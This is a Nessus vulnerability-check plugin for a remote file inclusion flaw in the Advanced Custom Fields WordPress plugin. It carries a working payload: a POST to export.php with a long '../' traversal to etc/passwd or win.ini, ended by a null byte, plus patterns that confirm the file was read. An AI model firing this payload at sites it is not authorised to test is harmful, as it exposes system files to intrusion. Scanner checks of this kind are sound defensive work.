#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63326);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_bugtraq_id(56528);
  script_osvdb_id(87353);

  script_name(english:"Advanced Custom Fields Plugin for WordPress 'acf_abspath' Parameter Remote File Inclusion");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is afffected by
a remote file inclusion attack.");
  script_set_attribute(attribute:"description", value:
"The version of the Advanced Custom Fields plugin for WordPress
installed on the remote host fails to properly sanitize user-supplied
input to the 'acf_abspath' parameter of its 'core/actions/export.php'
script. A remote, unauthenticated attacker can exploit this issue to
view arbitrary files or execute arbitrary PHP code, possibly taken
from third-party hosts, on the remote host.");
  # http://ceriksen.com/2012/11/14/wordpress-advanced-custom-fields-remote-file-inclusion-vulnerability/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?91911f17");
  script_set_attribute(attribute:"see_also", value:"http://www.advancedcustomfields.com/to-do/#3.5.2");
  script_set_attribute(attribute:"solution", value:"Upgrade to Advanced Custom Fields version 3.5.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"WordPress Advanced Custom Fields 3.5.1 RFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'WordPress Plugin Advanced Custom Fields Remote File Inclusion');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/11/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/11/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/12/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'Advanced Custom Fields';

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('#acf_fields');
  checks["/wp-content/plugins/advanced-custom-fields/js/fields.js"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

foreach file (files)
{
  url = "/wp-content/plugins/advanced-custom-fields/core/actions/export.php";
  attack =  mult_str(str:"../", nb:12) + file;

  res2 = http_send_recv3(
    method    : "POST",
    item      : dir + url,
    data      : "acf_abspath=" + urlencode(str:attack) + "%00",
    content_type : "application/x-www-form-urlencoded",
    port         : port,
    exit_on_fail : TRUE
  );
  body = res2[2];

  # Check for errors
  error_returned = FALSE;
  if (
    !isnull(body) &&
    (
      (attack+'\\0wp-load.php): failed to open stream:' >< body) ||
      (attack+'\\0wp-load.php) [function.include]: failed to open stream:' >< body) ||
      (attack+'\\0wp-load.php'+") [<a href='function.include'>function.include</a>]: failed to open stream:" >< body) ||

      #open_basedir
      (attack+'\\0wp-load.php) [function.require_once]: failed to open stream:' >< body) ||
      (attack+'\\0wp-load.php'+") [<a href='function.require-once'>function.require-once</a>]: failed to open stream:" >< body) ||
      ("open_basedir restriction in effect. File("+attack+")" >< body)
    )
  ) error_returned = TRUE;
  pat = file_pats[file];

  # check for expected output or an error and report findings
  if ((body =~ pat) || (error_returned))
  {
    if (report_verbosity > 0)
    {
      snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      if (error_returned)
      {
        report =
          '\nNessus was not able to exploit the issue, but was able to verify it' +
          '\n' + 'exists by examining the error message returned from the following' +
          '\n' + 'request :' +
          '\n' +
          '\n' + http_last_sent_request() +
          '\n' +
          '\n';
      }
      else
      {
        report =
          '\nNessus was able to exploit the issue to retrieve the contents of ' +
          '\n'+ "'" + file + "'" + ' using the following request :' +
          '\n' +
          '\n' + http_last_sent_request() +
          '\n' +
          '\n';
      }
      if (report_verbosity > 1)
      {
        report +=
          '\n' + 'This produced the following output :' +
          '\n' +
          '\n' + snip +
          '\n' + chomp(body) +
          '\n' + snip +
          '\n';
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
